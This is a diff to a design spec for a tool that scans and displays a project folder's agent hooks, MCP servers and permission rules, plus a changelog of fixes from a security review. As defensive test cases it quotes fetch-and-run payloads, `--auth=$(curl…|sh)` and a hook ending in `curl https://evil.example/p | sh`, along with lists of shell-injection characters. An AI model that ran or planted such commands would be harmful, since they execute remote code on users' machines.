@@ -1,6 +1,6 @@
 # Spec 061: A folder's own agent setup is used, and shown
 
-**Status:** draft. Owner decisions recorded (issue #289, 2026-10-20). Constitution **Amendment 1** (principle III, v1.1.0) is in force (#395). Review requirements FR-010..FR-014 added (Paco, Ruben, #394). Built (see `## Changes` 2026-10-21): scanner, decisions, dialog, per-app apply, chip, AI explanation; checked on real Claude Code and Copilot sessions.
+**Status:** built (2026-10-21; see `## Changes`), review on #424 fixed (2026-10-21, second entry). Owner decisions recorded (issue #289, 2026-10-20). Constitution **Amendment 1** (principle III, v1.1.0) is in force (#395). Review requirements FR-010..FR-014 (Paco, Ruben, #394). Checked on real Claude Code and Copilot sessions. Open: the `[KNOWN GAP]` list at the end. S1 decided by the owner on 2026-10-21.
 **Issue:** #289 (was spec 012 T083, `[KNOWN GAP]`). **Builds on:** 012 (Claude and Codex adapters), 019 (MCP), 043 (custom agents), 041/019 (secret masking), 003 (permission modes).
 
 ## Owner decisions (issue #289, 2026-10-20)
@@ -167,3 +167,51 @@ The user's own global settings (`~/.claude/settings.json`, `~/.codex/config.toml
   - Codex hooks are not supported (R2);
   - Read-only matching covers bare tools and `Bash` command rules only;
   - macOS and Windows are checked only through the shared code (the scanner uses `path` and `/` labels).
+
+### 2026-10-21: review on #424 fixed (Paco's agent: required 1-6, should S1-S3, nits)
+
+- **Required 1, masking hid payloads** (FR-014/FR-016) `[IMPLEMENTED]`:
+  - Hook commands and rules no longer use `maskSecretCommand`, whose flag- and name-based masking let a repository choose what is hidden (`--auth=$(curl…|sh)` was shown as `--auth=[redacted]`).
+  - `shownCommand` hides only real token shapes (GitHub, OpenAI/Anthropic keys, bearer tokens, JWTs, AWS keys). Their characters cannot contain shell syntax, so `$( )`, backticks, `${`, `|`, `;`, `&`, `<` and `>` are always shown, also to the AI explainer.
+  - An item with anything hidden carries `hidden: true`. The dialog says "Part of this command is hidden because it looks like a secret key" and leaves it unticked.
+  - MCP server arguments keep the flag-based masking. They are passed as arguments with no shell, so a hidden value cannot become a payload.
+  - `test:` the two strings from the review, a token-shaped header, and the explainer prompt.
+- **Required 2, not shown in full** `[IMPLEMENTED]`:
+  - There is no display cut any more: hooks (up to 4000 characters each, PowerShell variant included), rules and servers are shown whole, in a box that scrolls and is keyboard-focusable.
+  - A hook longer than 4000 characters, or a server longer than 8000 shown characters, is not listed. It appears as a problem and is never applied.
+  - `test:` the 1442-character hook ending in `curl https://evil.example/p | sh`, and a 4001-character hook.
+- **Required 3, quadratic TOML regexes** `[IMPLEMENTED]`:
+  - Comments are cut by a single quote-aware scan.
+  - `env` pairs are matched on trimmed text with `^([A-Za-z0-9_-]+)\s*=\s*(.*)$`.
+  - Lines over 4 KiB are skipped.
+  - `test:` 80k spaces in a value and in an `env` pair under 1 s (it was about 9 s and 19 s); `#` inside quotes is kept.
+- **Required 4, the FR-013 pin could be bypassed** `[IMPLEMENTED]`. The test is now case-insensitive and checks four things:
+  - importing `foldersetupipc`/`foldersetupstore` from anything but `main.ts`;
+  - any `.decide(` outside the two owner files;
+  - MCP, remote control and schedules naming the folder setup in any case;
+  - `main.ts` calling anything on `folderSetupStore` but `.get`, or calling `decide`/`scanView`/`explain`.
+
+  Both bypasses from the review are fed to the check, which catches them.
+- **Required 5, spec honesty:**
+  - **FR-005 / FR-012 chat line and activity-log entry** `[KNOWN GAP]`: not built. Claude Code and Copilot report a hook run in no event that Durbar maps today, so there is nothing truthful to show yet. The chip ("Read-only + folder rules") is built.
+  - **FR-010 store** (decision): spec 061 keeps its own `folder-setup.json`. Spec 019's import digest covers one import file and copies servers into the folder's extras. Spec 043's trust is per agent file. This spec needs accept/decline per item per folder, with the same digest style, and holds digests and paths only.
+  - **FR-010 store, interaction with spec 019:** a folder's `.mcp.json` server can be both imported by `mcp:importApply` and accepted here. `acceptedFor` leaves out any name the session already has (Durbar's own list wins), so it never starts twice.
+  - **FR-010 changed items** `[IMPLEMENTED]`: an item that is new or changed after an earlier answer starts unticked ("off until accepted again"). So do hidden items and broad allow rules.
+  - **FR-015** (decision): the explanation runs when the person chooses *Explain with AI*, one hook at a time, not by itself. It sends repository text to an agent app and costs a prompt, so it happens only on request.
+  - **FR-016 cost** `[IMPLEMENTED]`: the reported cost of the explanation is shown with it (`≈ $…` or `… AIU`, `costText`).
+  - **FR-001 agents and skills names** `[KNOWN GAP]`: not listed in this dialog. Custom agents keep spec 043's own per-file confirmation, and skills are not loaded from a folder by Durbar.
+- **Required 6:** Windows CI rerun to green (the failure was the flaky Electron download in `test:checkfuses`).
+- **S1, Read-only still means something.** **Decided by the owner** (Vikram, terminal, 2026-10-21): "broad allow rules need explicit tick like hooks".
+  - **Broad allow rules are off until the person ticks them**, with the same explicit confirmation as hooks. Broad means: a bare tool name, a pattern of only wildcards (`*`, `:*`, `**`, `*:*`), `Read`/`Edit`/`Write` without a narrow path (from the root, the home folder or a drive with `**`), and a `Bash` prefix without a specific command (`isBroadRule`, `needsConfirm`). Narrow rules follow the normal accept.
+  - **Defence in depth**, kept for ticked rules too. A folder allow rule covers the tool, never files outside the session's folders: `Read(*)`, `Read`, `Edit` and `Write` from the folder still get Durbar's path check in Read-only (`writeIsInsideRoots`).
+  - A `Bash(prefix:*)` rule needs a word boundary. A command with shell syntax (`;`, `&`, `|`, backticks, `$(`, `${`, `<`, `>`, a newline) never matches a prefix or exact rule in Durbar's hook.
+  - In the dialog, broad allow rules start unticked and are accepted only with the explicit tick (the store refuses them without it). The tick's text names them.
+  - `[KNOWN GAP]`: in Ask first, Claude Code applies an accepted allow rule itself, without Durbar's `canUseTool`. Read-only is where Durbar's hook adds the path check.
+- **S2, links** `[IMPLEMENTED]`: setup files are read with `lstat` (a link is a problem, not followed), and the file's real folder must be inside the folder (a linked `.codex/` pointing elsewhere is "outside the folder"). A linked `.github/hooks` is not listed.
+- **S3, digests** `[IMPLEMENTED]`: an MCP item's digest holds env and header **names**, never values.
+- **Nits** `[IMPLEMENTED]`:
+  - Copilot's private hook folder is removed when the session fails to start, and copies older than a day are swept once per run (`sweepOldHookDirs`).
+  - Agent info and starts use `scanFolderSetupCached`, the same scan while no setup file's size or change time moved; the dialog and `decide` still read the disk.
+  - Multi-root labels never collide (`rootLabels`: `web/app`, then a number).
+  - `[KNOWN GAP]`: a project marked trusted in the user's own `~/.codex/config.toml` lets Codex read the folder's `.codex/*` regardless of this dialog.
+- `test:` `scripts/test-foldersetup.ts` pins every item above.
